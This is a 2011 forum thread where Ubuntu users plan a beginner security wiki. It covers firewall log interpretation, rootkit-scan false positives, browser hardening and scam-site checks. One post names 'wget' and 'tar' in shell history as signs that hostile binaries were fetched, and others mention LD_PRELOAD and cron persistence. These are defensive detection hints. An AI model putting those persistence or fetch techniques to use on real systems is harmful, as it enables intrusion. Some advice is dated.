Please enter card details here - yeah right ! 

A mention of using the WHOIS network tool is easy enough to learn.

Ah well - got to go to bed !

---

### Post by lisati on 2011-11-07
> **SparTacux said:**
> TI did some shopping at a Jewelers with a .co.uk address recently - IP Destination was China :-)
Please enter card details here - yeah right ! 

And a "Yeah right" to the spammers who try to fool us by using email addresses that suggest that they're in one country when they're really in another. :D

The contributors to this thread deserve a beer!
[IMG]http://t3.gstatic.com/images?q=tbn:ANd9GcTETOOSal2j3zzVgEGXYCHtlxF0P5cfc7LjVIU8Wh5lCTisUfBV[/IMG]

---

### Post by Ms. Daisy on 2011-11-07
> In the last 6 days I have been following all of your contributions to  this thread - the progress you have made has been extraordinary and each  of you deserves congratulations of the highest order. To Ms. Daisy, I  believe you have breathed life into the project and deserve a special  commendation. 
As a technically challenged individual, I for one really appreciate all  of your efforts and look forward to filling gaps that have been missing  in my education and will relish the challenge of following the  guidelines outlined in your marvelous Wiki. Wow, thanks :oops: Is the psychocats blog yours?
> **haqking said:**
> I was wandering if the use of World of Warcraft (though a popular game) needs to be mentioned on a basic desktop security wiki ;-)

WOW brings into play Wine which has its own security related concepts to cover.

I don't see Wine and WoW as a default basic setup

Just my thoughtsNot sure I'm following you on that- how many of those virtual Guinness did you have? :wink:  Do you think Wine should be covered or not?  IMO Wine goes in the category of "know what you have, have what you know." I've got roughly 15,685 other topics to focus on so I'm afraid Wine is going to be near the very bottom of my list (unless it's Pinot Grigiot in which case it's much much higher).  And I don't know the first thing about gaming unless we're talking about pong.  But if someone else wants to take a crack at that stuff, feel free.  From an editor's point of view, a gaming section would probably appeal to the vast majority of the potential readers.> A mention of using the WHOIS network tool is easy enough to learn. I agree on that- if I can use it, then it's clearly easy!  > All the benefits of a good Firewall log.   I do hope you guys mention  looking at logs as part of your tutorial on security. I haven't seen  anyone mention it yet. Good point, something I want to learn anyway.

---

### Post by haqking on 2011-11-07
> **Ms. Daisy said:**
> Wow, thanks :oops: Is the psychocats blog yours?
**Not sure I'm following you on that- how many of those virtual Guinness did you have? :wink:  Do you think Wine should be covered or not?  IMO Wine goes in the category of "know what you have, have what you know."** I've got roughly 15,685 other topics to focus on so I'm afraid Wine is going to be near the very bottom of my list (unless it's Pinot Grigiot in which case it's much much higher).  And I don't know the first thing about gaming unless we're talking about pong.  But if someone else wants to take a crack at that stuff, feel free.  From an editor's point of view, a gaming section would probably appeal to the vast majority of the potential readers. I agree on that- if I can use it, then it's clearly easy!   Good point, something I want to learn anyway.

I am saying someone on there has mentioned using World of Warcraft, i was saying i dont think that needs to be on there.  If it is to stay on there then you need to discuss Wine and the security to go with it.

The last part of the brief firewall blurb goes to WOW, which is a very random addition in my opinion as it does not come under a default setup

---

### Post by BlinkinCat on 2011-11-07
> **Ms. Daisy said:**
> Wow, thanks :oops: Is the psychocats blog yours?

I wish! - ;)

---

### Post by haqking on 2011-11-07
> **Ms. Daisy said:**
> Wow, thanks :oops: Is the psychocats blog yours?


Psychocats is [[COLOR="Red"]Aysiu[/COLOR] ]("http://ubuntuforums.org/member.php?u=21941")one of the MODS here on the forum

---

### Post by Ms. Daisy on 2011-11-07
> **haqking said:**
> I am saying someone on there has mentioned using World of Warcraft, i was saying i dont think that needs to be on there.  If it is to stay on there then you need to discuss Wine and the security to go with it.

The last part of the brief firewall blurb goes to WOW, which is a very random addition in my opinion as it does not come under a default setupAh, sorry.  I didn't seen that on the Wiki until now.

Question for whomever knows, how is the Ubuntu documentation managed (at help.ubuntu.com)? I never see any dates on the pages, so how can a reader determine when the document was written & if it applies to their system?  Specifically this one [https://help.ubuntu.com/community/EncryptedHome](https://help.ubuntu.com/community/EncryptedHome) says "the new 9.10 release..." and therefore is probably no longer relevant.

---

### Post by Ms. Daisy on 2011-11-07
> **haqking said:**
> It is a difficult question.

I would recommend a good read of the CERT link i posted on the wiki

[http://www.cert.org/tech_tips/home_networks.html#I-A](http://www.cert.org/tech_tips/home_networks.html#I-A)

it is a noobish doc which covers a lot of concepts needed, it explains NAT, protocols, ports etc in simple wording and brief, it gives a good overall basics if you know what i mean.

it is basic though, but covers a lotThat's a great resource. Basic is exactly what us noobs are looking for! :)

---

### Post by haqking on 2011-11-07
> **Ms. Daisy said:**
> That's a great resource. Basic is exactly what us noobs are looking for! :)

yeah i figured it would suit, it is easy on the eyes and an easy read, covers the basics and doesnt baffle with science.

You can take some information away from it so thats always good.

Hope it helps.

Peace

---

### Post by haqking on 2011-11-07
> **Ms. Daisy said:**
> Ah, sorry.  I didn't seen that on the Wiki until now.

Question for whomever knows, how is the Ubuntu documentation managed (at help.ubuntu.com)? I never see any dates on the pages, so how can a reader determine when the document was written & if it applies to their system?  Specifically this one [https://help.ubuntu.com/community/EncryptedHome](https://help.ubuntu.com/community/EncryptedHome) says "the new 9.10 release..." and therefore is probably no longer relevant.

Scroll to the bottom and it tells you when it was last edited, you can edit them too

---

### Post by lisati on 2011-11-07
Just checking in here. I agree that the focus should be on basics. Keep up the good work, team.

---

### Post by Dangertux on 2011-11-07
Hey... I thought about something that might be beneficial to go into a "newbie security guide", I was writing a dry and boring article about rootkits for my blog today just because I haven't posted in forever. And something hit me. 

How many times on this forum do you see "here's my rkhunter/chkrootkit log" is this a false positive?

Maybe a section about what "getting owned" actually looks like, going back to auditing logs, it seems a lot of the users who are most security conscious need the most education in this area. They know the threats are there but have no idea how to detect them, thus are running around terrified at every message and every blinking light. 

Perhaps some discussion on things like netstat, lsof , spending time looking at auth.log, interpreting rkhunter and chkrootkit logs , might do well. Because I've seen two varieties of people very frequently. They fall into the categories of "nothing can get me" or "EVERYTHING WILL GET ME OMG OMG OMG!!!" for that second category , maybe a reference section including "clean" scan logs from the various anti-malware solutions, and some of the common false positives (jdk...python, etc) 

Just a thought.

---

### Post by Ms. Daisy on 2011-11-07
> **haqking said:**
> Scroll to the bottom and it tells you when it was last edited, you can edit them tooHa!  duh...

---

### Post by Ms. Daisy on 2011-11-07
> **Dangertux said:**
> Hey... I thought about something that might be beneficial to go into a "newbie security guide", I was writing a dry and boring article about rootkits for my blog today just because I haven't posted in forever. And something hit me. 

How many times on this forum do you see "here's my rkhunter/chkrootkit log" is this a false positive?

Maybe a section about what "getting owned" actually looks like, going back to auditing logs, it seems a lot of the users who are most security conscious need the most education in this area. They know the threats are there but have no idea how to detect them, thus are running around terrified at every message and every blinking light. 

Perhaps some discussion on things like netstat, lsof , spending time looking at auth.log, interpreting rkhunter and chkrootkit logs , might do well. Because I've seen two varieties of people very frequently. They fall into the categories of "nothing can get me" or "EVERYTHING WILL GET ME OMG OMG OMG!!!" for that second category , maybe a reference section including "clean" scan logs from the various anti-malware solutions, and some of the common false positives (jdk...python, etc) 

Just a thought.**That. Would. Be. Amazing.**  Any demystification we can do on those tests & outputs would be so worth while for both varieties of people, as well as the experts that always have to field questions here.  I'm roughly 2 years away from having the ability to write anything like that myself, first I need to google netstat, lsof, auth.log...

---

### Post by Dangertux on 2011-11-07
Ok well I guess I'll pony up and write that one, if anyone wants to add to it feel free to contribute. Just please make sure the information is accurate. *hint hint* I know at least one of you has incident response experience ;-)


EDIT : I added a ton of stuff down at the bottom. It's not quite finished I'm tired. Also if anyone knows how to insert pre-formatted text and wants to fix the log file excerpts in the section I did in there I would be forever gratefull. thanks :-)

Yeah the formatting is all screwed up if someone wants to clean up that and my grammar I would be forever indebted lol... Well I might send them a christmas card or something lol.

EDIT 2 : Fixed the grammar of what's there to the best of my American publicly schooled ability. Still can't make the dang netstat output line up. I might just end up doing a screenshot if I can't make that work. Will finish off the section tomorrow.

---

### Post by WasMeHere on 2011-11-08
> **Dangertux said:**
> Ok well I guess I'll pony up and write that one, if anyone wants to add to it feel free to contribute. Just please make sure the information is accurate. *hint hint* I know at least one of you has incident response experience ;-)


EDIT : I added a ton of stuff down at the bottom. It's not quite finished I'm tired. Also if anyone knows how to insert pre-formatted text and wants to fix the log file excerpts in the section I did in there I would be forever gratefull. thanks :-)

Yeah the formatting is all screwed up if someone wants to clean up that and my grammar I would be forever indebted lol... Well I might send them a christmas card or something lol.

EDIT 2 : Fixed the grammar of what's there to the best of my American publicly schooled ability. Still can't make the dang netstat output line up. I might just end up doing a screenshot if I can't make that work. Will finish off the section tomorrow.

Your 'ton of stuff down at the bottom' is very valuable and should definitely be easy to find. I suggest you write a short intro for our main wiki page and have a link to another page or thread, where the main part of it will be found.

---

### Post by SparTacux on 2011-11-08
> **Dangertux said:**
> 
Maybe a section about what "getting owned" actually looks like, going back to auditing logs, it seems a lot of the users who are most security conscious need the most education in this area. They know the threats are there but have no idea how to detect them, thus are running around terrified at every message and every blinking light. 

Perhaps some discussion on things like netstat, lsof , spending time looking at auth.log, interpreting rkhunter and chkrootkit logs , might do well. Because I've seen two varieties of people very frequently. They fall into the categories of "nothing can get me" or "EVERYTHING WILL GET ME OMG OMG OMG!!!" for that second category , maybe a reference section including "clean" scan logs from the various anti-malware solutions, and some of the common false positives (jdk...python, etc) 

Just a thought.

That's what I said a few posts back ;-)

Also an example of a fake website might come in handy. I'll dig out that Jewelers website I mentioned selling official branded Jewelery ( made in China selling at half price.  ) The newbies here can run an IP check on the Destination  IP's and get to grips with WHOIS so they don't fall for scams. 

I'm still getting email from Lucy Lui telling me about their latest offers :-)

---

### Post by WasMeHere on 2011-11-08
Here is a link to our wiki page for new readers of this thread. The wiki page is simple and has several valuable links for more details. It is under construction, but if you need basic information now, please read it!

[[COLOR="RoyalBlue"]_https://wiki.ubuntu.com/BasicSecurity_[/COLOR]]("https://wiki.ubuntu.com/BasicSecurity")

---

### Post by MrLeek on 2011-11-08
> **haqking said:**
> I am saying someone on there has mentioned using World of Warcraft, i was saying i dont think that needs to be on there.  If it is to stay on there then you need to discuss Wine and the security to go with it.

The last part of the brief firewall blurb goes to WOW, which is a very random addition in my opinion as it does not come under a default setup

Well the latest version of firewall (including the WoW bit) was written by me - and WoW was a last moment thing. Notwithstanding dealing with WINE & security (to be discussed later) I wanted to use an example to make people understand why we're opening up ports and why some things won't work. We open Port 80 for web browsing....but if you were playing WoW then you'd need to open up port xxxx. 

If there's a better example than WoW I'm all for it - the acid test is to see if the extra paragraph bridges the gap. Danger's thread covers the how and hopefully I've added enough "why" to that.

As for WINE - most people switching will have games on their mine. Therefore WINE needs to be considered. At the same time WINE is not really a "basic" thing. Since I've got Steam running through WINE at the moment it's a topic of interest for me.

---

### Post by haqking on 2011-11-08
> **MrLeek said:**
> Well the latest version of firewall (including the WoW bit) was written by me - and WoW was a last moment thing. Notwithstanding dealing with WINE & security (to be discussed later) I wanted to use an example to make people understand why we're opening up ports and why some things won't work. We open Port 80 for web browsing....but if you were playing WoW then you'd need to open up port xxxx. 

If there's a better example than WoW I'm all for it - the acid test is to see if the extra paragraph bridges the gap. Danger's thread covers the how and hopefully I've added enough "why" to that.

As for WINE - most people switching will have games on their mine. Therefore WINE needs to be considered. At the same time **WINE is not really a "basic" thing**. Since I've got Steam running through WINE at the moment it's a topic of interest for me.


It just seemed random that was all. especially as Wine security was not discussed.

However you guys put what you like on there, i didnt remove it, i just questioned it.

Peace

---

### Post by OpSecShellshock on 2011-11-08
> **Dangertux said:**
> Ok well I guess I'll pony up and write that  one, if anyone wants to add to it feel free to contribute. Just please  make sure the information is accurate. *hint hint* I know at least one  of you has incident response experience :wink:


Wow, in a lot of ways I'm glad this came up after I went to bed,  because otherwise I probably wouldn't have. I'm reading the relevant  section now, but am leaving for work shortly. Short contribution to log  auditing: users should take note of what the logs look like when they  know the system is clean. Also, the log file viewer application usually  has a couple days' worth of logs in it, possibly going back to the last  startup time?

The .bash_history file in the home directory  contains a running list of commands run in a terminal by that user. I  thought it was supposed to be emptied at the end of every session, but I  have just discovered that mine doesn't seem to have been. Not going to  worry about that now, but if a terminal has been invoked as part of a  user session compromise there may be some information there. I'm not  sure this applies when invoked by a shell script. Believe it or not it  hadn't occurred to me to check until today. Look for things like "wget"  and "tar" which might indicate retrieval and decompression of binaries  from off site. Those are also things you can check other people's  scripts for before running them (if you must).

rkhunter and  chkrootkit (as well as tripwire, which, n00bs: just don't. Not yet.)  need to be calibrated against a known clean installation and again after  every system change (like software updates). As with some of the logs,  keep the results of a scan against a known-clean version, like a new  install, handy to compare against future results. Starting out, you  don't necessarily have to know what to look for, but you should at least  know when something is different than it was before so you have a basis  for asking support questions.

Anyway, work. Need to go to work soon. Oh boy, rabbit hole.

---

### Post by MrLeek on 2011-11-08
> **Dangertux said:**
> Ok well I guess I'll pony up and write that one, if anyone wants to add to it feel free to contribute. Just please make sure the information is accurate. *hint hint* I know at least one of you has incident response experience ;-)
.

Obviously this is REALLY useful! What I might try to do is re-write your guide in a "this is how i understand it" style - again, try and boil it down to the key points for newbies. Naturally it won't cover everything, but then a newbie guide never will.

---

### Post by MrLeek on 2011-11-08
> **haqking said:**
> It just seemed random that was all. especially as Wine security was not discussed.


It just kinda popped into my head - "what else would explain the next steps in maintaining a firewall". Funny really since I've not played WoW for months.....

---

### Post by haqking on 2011-11-08
I added a little piece to the wiki at the end of the password section about password strength meters.

[https://wiki.ubuntu.com/BasicSecurity#It_All_Starts_With_a_Good_Password](https://wiki.ubuntu.com/BasicSecurity#It_All_Starts_With_a_Good_Password)

I hate these services

I know they are popular, but just remember that you are effectively giving someone online your password and/or passwords...do you trust them especially as they now have your IP address also possibly ?

I could set up the same thing in 10 minutes and then when people search for password tester it may bring them to my site or i could post it here, and sit back and harvest IP addresses and possible passwords to match.

Peace

---

### Post by Ms. Daisy on 2011-11-08
> **haqking said:**
> I added a little piece to the wiki at the end of the password section about password strength meters.

[https://wiki.ubuntu.com/BasicSecurity#It_All_Starts_With_a_Good_Password](https://wiki.ubuntu.com/BasicSecurity#It_All_Starts_With_a_Good_Password)

I hate these services

I know they are popular, but just remember that you are effectively giving someone online your password and/or passwords...do you trust them especially as they now have your IP address also possibly ?

I could set up the same thing in 10 minutes and then when people search for password tester it may bring them to my site or i could post it here, and sit back and harvest IP addresses and possible passwords to match.

PeaceI thought the same thing but I've got nothing but a tin foil hat backing it up.  Thanks.

---

### Post by haqking on 2011-11-08
> **Ms. Daisy said:**
> I thought the same thing but I've got nothing but a tin foil hat backing it up.  Thanks.

ha well to be honest it is no different to any site where you enter your password of course.  But there are lots of sites setup to do this in particular where you are likely to enter lots of passwords and combinations, then of course if they are tracking your browsing....you know like when facebook icons pop up on other sites with your profile pic asking if you want to login via facebook ? anyways just my opinion, trust who you give your passwords too for testing.

Edit: not that i use facebook anymore, i was using it as an example and things like that can be prevented.  Just an example

Cheers

---

### Post by Dangertux on 2011-11-08
Okay finished my little  section up about logs and such, haqking and OpSecShellshock if you can double check me or make comments/crits/changes I'd appreciate it .

Thanks all hope it's helpful.

P.S: I owned a Ubuntu VM just for you guys ;-)

---

### Post by CharlesA on 2011-11-08
> **Dangertux said:**
> Okay finished my little  section up about logs and such, haqking and OpSecShellshock if you can double check me or make comments/crits/changes I'd appreciate it .

Thanks all hope it's helpful.

P.S: I owned a Ubuntu VM just for you guys ;-)

Nice job owning that box! ;)

---

### Post by MrLeek on 2011-11-08
> **Dangertux said:**
> Okay finished my little  section up about logs and such, haqking and OpSecShellshock if you can double check me or make comments/crits/changes I'd appreciate it .

Thanks all hope it's helpful.

P.S: I owned a Ubuntu VM just for you guys ;-)

When I said I'll try and re-write it newbie style? I lied! :D A seriously nice piece of work!

I might do a summary thing at the top, just to help people get into it (aka what I've learnt whilst studying this!). For example, it's one thing to know how to view the system log, another thing to know what on earth to look for! 

At the moment I'm trying the google method - "WWAN enabled by radio killswitch" doesn't bring back anything horrific, so that's probably normal behaviour (I hope!!)

---

### Post by Dangertux on 2011-11-08
> **MrLeek said:**
> When I said I'll try and re-write it newbie style? I lied! :D A seriously nice piece of work!

I might do a summary thing at the top, just to help people get into it (aka what I've learnt whilst studying this!). For example, it's one thing to know how to view the system log, another thing to know what on earth to look for! 

At the moment I'm trying the google method - "WWAN enabled by radio killswitch" doesn't bring back anything horrific, so that's probably normal behaviour (I hope!!)

It means your onboard wireless was enabled by use of the hardware switch (or a keyboard button or bios).

---

### Post by MrLeek on 2011-11-08
Cheers Danger - few others if you're around (along with my guess!):
```

[UFW BLOCK] IN= OUT=eth0 SRC=192.168.x.x DST=192.168.1.255 LEN=78 TOS=0x00 PREC=0x00 TTL=64 ID=0 DF PROTO=UDP SPT=40221 DPT=137 LEN=58  

```Edited out the source IP address, but UFW = firewall so it looks like something was blocked from my PC to that dest. IP. No idea what that 1.255 is though!

 ```
[10803.695419] type=1400 audit(1320768676.688:56): apparmor="DENIED" operation="open" parent=1 profile="/usr/bin/freshclam" name="/usr/share/samba/valid.dat" pid=1633 comm="freshclam" requested_mask="r" denied_mask="r" fsuid=115 ouid=0 
 
```So apparmor is is denying freshclam (AV related I assume). Preventing an update perhaps?


```
 [UFW BLOCK] IN= OUT=eth0 SRC=2002:5cee:636d:0000:0224:1dff:fecc:fdb1 DST=ff02:0000:0000:0000:0000:0000:0000:00fb LEN=87 TC=0 HOPLIMIT=255 FLOWLBL=0 PROTO=UDP SPT=5353 DPT=5353 LEN=47  
 
```                      

Beats me! Firewall is blocking something!

---

### Post by Dangertux on 2011-11-08
> **MrLeek said:**
> Cheers Danger - few others if you're around (along with my guess!):
```

[UFW BLOCK] IN= OUT=eth0 SRC=192.168.x.x DST=192.168.1.255 LEN=78 TOS=0x00 PREC=0x00 TTL=64 ID=0 DF PROTO=UDP SPT=40221 DPT=137 LEN=58  

```Edited out the source IP address, but UFW = firewall so it looks like something was blocked from my PC to that dest. IP. No idea what that 1.255 is though!

 ```
[10803.695419] type=1400 audit(1320768676.688:56): apparmor="DENIED" operation="open" parent=1 profile="/usr/bin/freshclam" name="/usr/share/samba/valid.dat" pid=1633 comm="freshclam" requested_mask="r" denied_mask="r" fsuid=115 ouid=0 
 
```So apparmor is is denying freshclam (AV related I assume). Preventing an update perhaps?


```
 [UFW BLOCK] IN= OUT=eth0 SRC=2002:5cee:636d:0000:0224:1dff:fecc:fdb1 DST=ff02:0000:0000:0000:0000:0000:0000:00fb LEN=87 TC=0 HOPLIMIT=255 FLOWLBL=0 PROTO=UDP SPT=5353 DPT=5353 LEN=47  
 
```Beats me! Firewall is blocking something!


1st is blocking netbios UDP broadcast traffic

2nd apparmor is denying freshclam from accessing /usr/share/samba/valid.dat

3rd is ipv6 multicast traffic

---

### Post by MrLeek on 2011-11-08
> **Dangertux said:**
> 
3rd is ipv6 multicast traffic

Thanks again (and that helps me translate some of the other things. But I've seen a few mentions of a multicast IP address in these logs. Doing some homework on the subject now (nothing is shouting "PANIC" at me, and you've not said anything bad yet!)

---

### Post by SparTacux on 2011-11-08
> **Dangertux said:**
> Okay finished my little  section up about logs and such, haqking and OpSecShellshock if you can double check me or make comments/crits/changes I'd appreciate it .

Thanks all hope it's helpful.

P.S: I owned a Ubuntu VM just for you guys ;-)

 Who's computer did you crack Danger? I'd better install NOSCRIPT before I visit your wordpress webpage ;-)

---

### Post by Dangertux on 2011-11-08
> **SparTacux said:**
> Who's computer did you crack Danger? I'd better install NOSCRIPT before I visit your wordpress webpage ;-)

It was a 10.04.3 virtual machine with a F15 host, that belonged to me.

---

### Post by MrLeek on 2011-11-08
> **SparTacux said:**
> Who's computer did you crack Danger? I'd better install NOSCRIPT before I visit your wordpress webpage ;-)

It's too late for me - I found his blog in separate searches!!! :(

---

### Post by OpSecShellshock on 2011-11-08
> **MrLeek said:**
> It's too late for me - I found his blog in separate searches!!! :(

Always have NoScript at the ready whenever you go anywhere near anything running Wordpress :) (though their own hosted sites I think are updated more regularly than when folks are just using it as a CMS).

---

### Post by MrLeek on 2011-11-08
> **OpSecShellshock said:**
> Always have NoScript at the ready whenever you go anywhere near anything running Wordpress :) (though their own hosted sites I think are updated more regularly than when folks are just using it as a CMS).

I never leave home without it! :)

Mind you it did get me thinking about the untrusted feature in no script. Sure, everything is untrusted by default. But it's easy for people who don't understand these things to just "allow all at this page". 

As it works now is fine for me, but blocking a pre-determined list of sites may be the safer option for other people. It looks like you can drop a large list into a config file, so I'm having a quick scan at [http://urlblacklist.com/?sec=download](http://urlblacklist.com/?sec=download) to see if that can be a useful source. Unless this is a bad idea, or the cleaver people know a better way to do it?

---

### Post by OpSecShellshock on 2011-11-08
> **MrLeek said:**
> I never leave home without it! :)

Mind you it did get me thinking about the untrusted feature in no script. Sure, everything is untrusted by default. But it's easy for people who don't understand these things to just "allow all at this page". 

As it works now is fine for me, but blocking a pre-determined list of sites may be the safer option for other people. It looks like you can drop a large list into a config file, so I'm having a quick scan at [http://urlblacklist.com/?sec=download](http://urlblacklist.com/?sec=download) to see if that can be a useful source. Unless this is a bad idea, or the cleaver people know a better way to do it?

Don't fear the whitelist! It's better for you. Oh, and if you're doing configuration of NoScript, make sure you check the box next to "apply these settings to trusted sites" or whatever it says.

---

### Post by Dangertux on 2011-11-08
Alright I made a few last additions to my little section about getting owned. 

I expounded on cron jobs, hooking LD_PRELOAD and ld.so.conf as well as run level scripts and network startup scripts. I think that covers just about everything I could think of. If anyone has any suggestions or additions feel free.

EDIT : I just realized the damn thing is longer than the wiki itself.... Feel free to trim it lol.

---

### Post by haqking on 2011-11-08
> **Dangertux said:**
> Alright I made a few last additions to my little section about getting owned. 

I expounded on cron jobs, hooking LD_PRELOAD and ld.so.conf as well as run level scripts and network startup scripts. I think that covers just about everything I could think of. If anyone has any suggestions or additions feel free.

EDIT : I just realized the damn thing is longer than the wiki itself.... Feel free to trim it lol.

Great write up DT.

About time we had some reality on the forums instead of the usual Linux/Ubuntu is secure so dont worry about anything comments.

Way too many people on here thinking they are in a concrete bunker because its not windows...blah blah

Cheers

---

### Post by OpSecShellshock on 2011-11-08
> **haqking said:**
> Great write up DT.

About time we had some reality on the forums instead of the usual Linux/Ubuntu is secure so dont worry about anything comments.

Way too many people on here thinking they are in a concrete bunker because its not windows...blah blah

Cheers

How serendipitous that work on this began just as "HD Moore's Law" started to become a thing!

And DT, thanks for adding the LD_PRELOAD stuff. I was wondering if we shouldn't add something about path specifications in light of how huge it turned out to be in Windows, but thought it might have been too obscure. Note to those following along: it was huge because it had to be addressed per individual application and because if that didn't/doesn't happen (not all done yet!) it could lead to library load injection, which is very bad.

---

### Post by SparTacux on 2011-11-08
> **Dangertux said:**
> Alright I made a few last additions to my little section about getting owned. 

I expounded on cron jobs, hooking LD_PRELOAD and ld.so.conf as well as run level scripts and network startup scripts. I think that covers just about everything I could think of. If anyone has any suggestions or additions feel free.

EDIT : I just realized the damn thing is longer than the wiki itself.... Feel free to trim it lol.

 LOL  Can you narrow it down to one sentence ;-)

---

### Post by lisati on 2011-11-08
> **haqking said:**
> 
I could set up the same thing in 10 minutes and then when people search for password tester it may bring them to my site or i could post it here, and sit back and harvest IP addresses and possible passwords to match.

Same here, e.g. [http://lisati.homelinux.com/blacklist](http://lisati.homelinux.com/blacklist) :D

---

### Post by haqking on 2011-11-08
> **lisati said:**
> Same here, e.g. [http://lisati.homelinux.com/blacklist](http://lisati.homelinux.com/blacklist) :D

indeed ;-)

---

### Post by Ms. Daisy on 2011-11-08
> **Dangertux said:**
> Okay finished my little  section up about logs  and such, haqking and OpSecShellshock if you can double check me or  make comments/crits/changes I'd appreciate it .

Thanks all hope it's helpful.

P.S: I owned a Ubuntu VM just for you guys :wink:Thanks DT! Poor little VM :wink:   I started looking at my big, scary-looking logs while I read it, but  the write-up does a nice job of making the logs far more  comprehensible.  And most of all it gives me a nice jumping-off point to  research what I need to know.  I have a feeling I'll be referring back  to your write-up a lot.  

Yes it's long, but I vote to leave it in the Wiki as is. 

Oh  yeah, and in regards to the WoW & Wine thing, I think now I see  where you were trying to go with that MrLeek.  It looks like you (or  someone) added a better discussion IMO that was more broad.  In that  section I'd like to see a tutorial on how to find what ports I need  & what I have on my machine.  I think I can probably handle writing  that.  Do you think that would be useful or am I the only clueless noob  on that front?
 
[QUOTE=SparTacux]LOL  Can you narrow it down to one sentence :wink:[/QUOTE]Feel free to make your suggestion for the one sentence here, SparTacux :wink:
[QUOTE=haqking]indeed :wink:[/QUOTE]:lolflag:

---

### Post by Dangertux on 2011-11-08
> Privacy and security aren't the same  thing, but there is a considerable overlap in the tools for dealing with  them. The Register article missed a couple other nice add-ons I like to  use, such as RequestPolicy and RefControl. At some point it would be  good to do a whole thing on browser security here, but it's just too big a task for me to take on at the moment.



So... I read this in another thread... Think we need a browser security section ;-) ???

I know someone would LOVE to chase down LSO's with me ;-)

---

### Post by OpSecShellshock on 2011-11-08
> **Dangertux said:**
> So... I read this in another thread... Think we need a browser security section ;-) ???

I know someone would LOVE to chase down LSO's with me ;-)

We absolutely need a browser section. Whoever you were quoting there is a sharp guy!

---

### Post by Dangertux on 2011-11-08
I agree you are rather clever ;)

But I do think browser security is important since that is where 95% of users are going to get into trouble. At least in desktop use cases. I'm not going in alone on that one though I think that will be an important learning curve for all involved in the project. 

Just my 2 cents. Also if you guys need some info on wine security i can help there though I am not sure it meets the general use case criteria.

---

### Post by OpSecShellshock on 2011-11-08
OK then, some quick notes while I'm thinking about it (this is just going to be for Firefox since that's what I'm most familiar with):

Preferences: uncheck accept cookies, whitelist sites for specific needs using exceptions, allow for session at most; clear history when closing the browser, don't save history. Don't use the hardware acceleration.

about:config--I'm pretty sure there's something in here where you can disable the ability to run scripts directly from the URL bar, that's probably important

NoScript: well it needs to be installed, but there are a lot of options to go over. Can add a "revoke temporary permissions" button to the toolbar. Can be used to disable WebGL.

Adblock Plus: install, grab the default list, probably fine after that, can block any individual ads or scripts that show up by adding them manually

BetterPrivacy: remove all LSOs when closing the browser (and after every known use of Flash content). Can add a button to the toolbar to make it easy to call up.

RefControl: strips out referrer headers, makes some malicious sites think you're a search bot or malware researcher, and otherwise stops the collection of referral information.

RequestPolicy: not for lightweights, very similar to NoScript and probably has some redundancy, good for an education in how pages on the web actually load/function

Plugins: disable Java/OpenJDK plugins, disable plugin to load PDFs in the browser window

EDIT: Almost forgot: use BleachBit after every browsing session.

---

### Post by jramshu on 2011-11-08
Was just browsing through yalls wiki and this caught my eye:
> * Someone who knows what they're doing can use information you post on various forums to exploit your system. Think about the information you're posting about your computer, your router. Unfortunately we can't tell you what to post and what not to post unless you have some basic knowledge.

This is very important when it comes to your security. Never post revealing information on the internet!!! and ! for good measure. Only go to websites you know or can be verified!

IP Add+Port#'s+Services=hack attempt
Security questions+social website=access

Also, don't go investigating how hackers get in by visiting 'their' domain. Remember, even the moderators are hackers. The server logs your ip, your browser and version, your os info, everything you really would rather them not have, and through techniques you guys played with inside your network they can get your router info and check for vulnerabilities. This is critical if you have a forward facing server you are playing with and don't know how to secure it.

I'm sorry but I may have strayed off, but this was supposed to be about social engineering.

---

### Post by CharlesA on 2011-11-08
> **jramshu said:**
> Remember, even the moderators are hackers. The server logs your ip, your browser and version, your os info, everything you really would rather them not have, and through techniques you guys played with inside your network they can get your router info and check for vulnerabilities. This is critical if you have a forward facing server you are playing with and don't know how to secure it.

Just because someone could get or has certain information, doesn't make them a "hacker."

I don't have access to the web or db server, so how would I know what OS or browser you are using?

---

### Post by jramshu on 2011-11-08
You missed the point bro, I wasn't saying that everyone privy to the info is a cracker. But you need to realize if you go on cracking websites, yes all the moderators are crackers. Actually to be a moderator on their site you have to be good at it, and trusted.

I was talking about if you visit cracking websites to learn how to crack and how to patch(Because the best patchers are the crackers). They are using various methods to detect browsers and os's. IP's, browser info, and os's are logged and accessible by moderators, heck everyone can see your os and browser if you post in the forums, their forums that is(Though this isn't always visible to the normal users). You have to be a mod to get the ip's.

---

### Post by lisati on 2011-11-08
> **jramshu said:**
> Also, don't go investigating how hackers get in by visiting 'their' domain. Remember, even the moderators are hackers. 
I would respectfully suggest that "crackers" might be a better word than "hackers" in this context, but that's possibly a discussion better suited to another thread.

---

### Post by jramshu on 2011-11-08
I'm sorry, I agree. I should have used "cracker."

EDIT: What I was basically getting at is don't go blindly into the world of cracking in order to learn in-depth security without good knowledge of what is out there. It's an easy way of getting your box or boxes owned. 

I was just trying to give a little heads up on sites not to visit for security.

No offense intended.

---

### Post by Dangertux on 2011-11-08
If you're worried about someone gleaning your headers etc from apache logs I suggest checking this out : 
[https://addons.mozilla.org/en-US/firefox/addon/tamper-data/](https://addons.mozilla.org/en-US/firefox/addon/tamper-data/)

---

### Post by MrLeek on 2011-11-09
> **Ms. Daisy said:**
> 
Oh  yeah, and in regards to the WoW & Wine thing, I think now I see  where you were trying to go with that MrLeek.  It looks like you (or  someone) added a better discussion IMO that was more broad.  In that  section I'd like to see a tutorial on how to find what ports I need  & what I have on my machine.  I think I can probably handle writing  that.  Do you think that would be useful or am I the only clueless noob  on that front?


Well the paragraph that I wrote links into Danger's forum thread (there's a link there to "common port numbers"), which covers the main ports that need to be added. Once we get the point across that the port numbers that you unblock relate to something that you do on the net (web browsing, email, WoW, etc.) then a lot of the mystery behind firewalls is removed.

> **Dangertux said:**
> 
But I do think browser security is important since that is where 95% of users are going to get into trouble. At least in desktop use cases. I'm not going in alone on that one though I think that will be an important learning curve for all involved in the project. 

Just my 2 cents. Also if you guys need some info on wine security i can help there though I am not sure it meets the general use case criteria.

Well I found your blogs on WINE recently which I'm slowly digesting and I'll probably come back with some questions. Re browser security I totally agree, but it's another long(ish) session in a wiki page. So I keep coming back to a 2 page document: "The things you must do" (auto security updates, firewalls, etc); and "Things you should learn about" (analysing sys logs)

If everyone understands the former then things are a lot better - and not everyone will have the patience to learn how to read logs.

---

### Post by Ms. Daisy on 2011-11-09
> **jramshu said:**
> I'm sorry, I agree. I should have used "cracker."
EDIT: What I was basically getting at is don't go blindly into the world of cracking in order to learn in-depth security without good knowledge of what is out there. It's an easy way of getting your box or boxes owned. 
